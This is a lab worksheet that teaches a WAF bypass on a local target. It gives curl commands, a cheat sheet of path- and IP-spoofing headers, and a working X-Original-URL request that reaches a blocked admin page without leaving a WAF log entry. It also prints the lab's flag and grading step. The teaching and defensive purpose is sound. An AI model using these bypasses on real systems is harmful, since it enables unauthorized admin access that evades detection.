## Activity 2: WAF Bypass via Header Smuggling

### Objective
- Identify which mod_security rule is blocking a specific endpoint, by reading the WAF audit log.
- Understand why naive bypass attempts (URL encoding, case variation) fail against a properly-tuned WAF rule.
- Learn the WAF-bypass header cheat sheet that pentesters keep in their head as a "first try" against any Apache or IIS stack with a WAF.
- Apply header-based path injection (`X-Original-URL`) to reach a restricted admin endpoint and recover its flag.
- Verify that the bypass leaves no trace in the WAF audit log — a defender-side observation that explains why this class of bypass is hard to detect.

### Background

In Activity 1 you confirmed that this app sits behind a mod_security WAF, and that hitting `/admin` returns a 403. In this activity you'll find a way through.

The single mental model for this whole activity:

> **WAFs inspect what they see. If you can change what they see, you bypass them.**

You're going to test that idea three ways: an obvious bypass (which fails, and that's the lesson), a header-smuggling bypass (which succeeds), and a verification step on the audit log (which proves *why* it succeeded).

### The target

Same web application as Activity 1: `http://localhost:30000`. The path you want to reach is `/admin/dashboard`.

### Step 1 — Confirm the Block

```
curl -i http://localhost:30000/admin/dashboard
```

Expected:
```
HTTP/1.1 403 Forbidden
Server: Apache/2.4.66 (Debian)
```

The WAF is doing its job. Now find out *which rule* is blocking it.

### Step 2 — Identify the Rule from the Audit Log

The lab gives you two ways to view the WAF audit log. Use whichever you prefer.

#### Option A — Browser
Open `http://localhost:30000/lab/waf-log`. You should see your last request:

| Time | Method | Blocked URI | Rule ID | Message |
|---|---|---|---|---|
| ... | GET | `/admin/dashboard` | 100001 | Admin path blocked by WAF |

#### Option B — Terminal
```
tail -n 30 /tmp/modsec_audit.log
```

Look for the line that says:
```
Message: Access denied with code 403 (phase 1).
String match "/admin" at REQUEST_URI.
[id "100001"] [msg "Admin path blocked by WAF"]
```

**What you learned:** Rule `100001` is matching the `REQUEST_URI` variable against the literal string `/admin`. To get past, you need to make `REQUEST_URI` look like something that doesn't match.

### Step 3 — Try the Obvious Bypass First: URL Encoding

A naive attacker would try to disguise `/admin` by URL-encoding the letters. The letter `a` is `%61` in URL-encoded form, so let's hide it:

```
curl -i http://localhost:30000/%61dmin/dashboard
```

Result:
```
HTTP/1.1 403 Forbidden
```

Still blocked. Refresh `/lab/waf-log` — the same rule fired. Try a few more variants for completeness:

```
curl -i http://localhost:30000/ADMIN/dashboard
curl -i http://localhost:30000/%41dmin/dashboard      # %41 = 'A'
curl -i http://localhost:30000/%2561dmin/dashboard    # double-encoded %61
```

All return 403.

#### Why this fails here

A well-tuned WAF rule applies *transformations* to the input *before* matching. Our rule has `t:urlDecodeUni,t:lowercase` baked in:
- `t:urlDecodeUni` decodes URL escape sequences (`%61` → `a`, `%41` → `A`, even `%2561` → `%61` → `a` for double encoding)
- `t:lowercase` makes the match case-insensitive

So the rule sees `/%61dmin`, `/ADMIN`, and `/%2561dmin` all as `/admin` for matching purposes. Encoding tricks don't beat a rule whose author thought about them.

This is an important negative result. **Real production WAFs are not defeated by `%XX` games when the rule author bothered to add transformations.** You need a deeper trick.

### Step 4 — Think Like a Pentester: The Header Cheat Sheet

URL encoding failed because the WAF normalizes the URL before inspecting it. So inspecting the URL is a dead end. **Time to attack a different surface.**

There's a well-known class of WAF bypass that doesn't touch the URL at all — instead, it smuggles the real path in an HTTP **header** that the backend obeys but the WAF doesn't inspect. Pentesters keep these in their head as a "first try" cheat sheet against any Apache or IIS stack with a WAF:

| Header | What it can do (when the backend honors it) | Stack famous for it |
|---|---|---|
| `X-Original-URL` | Override the request path | IIS / ASP.NET, Apache mod_rewrite quirks |
| `X-Rewrite-URL` | Override the request path (alternative name) | Same family |
| `X-Forwarded-For` | Spoof source IP for IP-allowlist rules | Reverse-proxy stacks |
| `X-Real-IP` | Spoof source IP | nginx-fronted apps |
| `X-Custom-IP-Authorization` | Spoof auth context | Custom auth middleware |
| `X-Original-Host` | Override Host for routing | Multi-tenant apps |

These all exploit the same idea: **the WAF inspects component A, but a downstream component obeys component B**. If A and B disagree, the WAF guards a door that nobody walks through.

For path-blocked endpoints like ours, the path-rewriting headers (`X-Original-URL`, `X-Rewrite-URL`) are the obvious first try.

### Step 5 — Apply the Bypass

Try `X-Original-URL`:

```
curl -i -H "X-Original-URL: /admin/dashboard" http://localhost:30000/
```

Result:
```
HTTP/1.1 200 OK
Server: Apache/2.4.66 (Debian)
Content-Type: text/html; charset=utf-8

... <div class="admin-banner"> ...
... <div class="flag-box">flag=admin_breached_via_url_rewrite</div> ...
```

You're in. To extract the flag in one go:

```
curl -s -H "X-Original-URL: /admin/dashboard" http://localhost:30000/ | grep -oE "flag=[a-z_]+"
```

Output:
```
flag=admin_breached_via_url_rewrite
```

#### What just happened

You sent `GET / HTTP/1.1` with a header `X-Original-URL: /admin/dashboard`. mod_security looked at the request line, saw `REQUEST_URI = /`, found nothing matching its rules, and let the request through. *After* the WAF's check, Apache's `mod_rewrite` looked at the headers, found `X-Original-URL` non-empty, and internally rewrote the request to `/admin/dashboard` before forwarding to the application backend.

The WAF and the routing layer disagreed about what URL you were really requesting. Your header exploited that disagreement.

> **Why try `X-Original-URL` first?** Historical: this exact bypass class first appeared in IIS/ASP.NET with the `X-Original-URL` header, and many Apache stacks copied the pattern in their own rewrite rules. It has the highest hit rate of any header in the cheat sheet. If it had failed, the next thing to try is `X-Rewrite-URL` (same effect, different name some stacks use). Pentesters work down the cheat sheet methodically.

### Step 6 — Doing the Bypass in the Browser (Optional)

If you prefer the browser to curl:

1. Open Firefox or Chrome DevTools (**F12**).
2. Go to the **Network** tab.
3. Visit `http://localhost:30000/` — you'll see the request appear in the network panel.
4. Right-click the request → **Edit and Resend** (Firefox) or **Replay XHR** (Chrome).
5. Add a header: `X-Original-URL: /admin/dashboard`.
6. Click Send.
7. The response body is the admin dashboard HTML, including the flag.

Browser extension alternative: install **ModHeader**, configure it to add `X-Original-URL: /admin/dashboard` for `localhost`, then visit `http://localhost:30000/` directly.

### Step 7 — Verify the Bypass Left No Trace

Refresh `/lab/waf-log`. Notice that **no new entry appears** for your bypass request — because mod_security never saw `/admin` in the URI. From its point of view, you simply requested `/`. This is exactly why the bypass worked: a defense that inspects only the surface can be evaded by hiding the payload one layer deeper.

This is also why **detecting** this kind of bypass is hard. The request looks completely normal in WAF logs. The only way a defender can spot it is by correlating `X-Original-URL` (or similar) headers in **access logs** with the rewritten paths the application actually served. Most teams don't.

### Submission

Paste the flag into `/home/labDirectory/flag.txt`. Save the file and click **Evaluate**.

Or via terminal:
```
echo "flag=admin_breached_via_url_rewrite" > /home/labDirectory/flag.txt
bash /home/.evaluationScripts/evaluate.sh
```

### What you practiced

| Step | Skill |
|---|---|
| 1 | Reading WAF block responses |
| 2 | Reading mod_security audit logs to identify the responsible rule |
| 3 | Understanding why naive encoding tricks fail against properly-tuned WAF rules |
| 4 | Reaching for the WAF-bypass header cheat sheet |
| 5 | Applying header-based path injection (`X-Original-URL`) |
| 7 | Verifying the bypass left no trace in the WAF log |

Activity 3 will hand you a *different* web app with **two** restricted endpoints, each protected by a slightly differently-tuned rule. You'll need to figure out which bypass works on which.

### Further reading

- [PortSwigger Web Security Academy — Bypassing access controls via HTTP method or header manipulation](https://portswigger.net/web-security/access-control)
- [OWASP Cheat Sheet — Web Application Firewall Evaluation](https://owasp.org/www-community/Web_Application_Firewall)
- [HackTricks — 403 & 401 Bypasses](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses) (good list of the same header-smuggling techniques used in this activity)
- [mod_security Reference Manual — Variables and Transformations](https://github.com/SpiderLabs/ModSecurity/wiki/Reference-Manual-(v2.x))
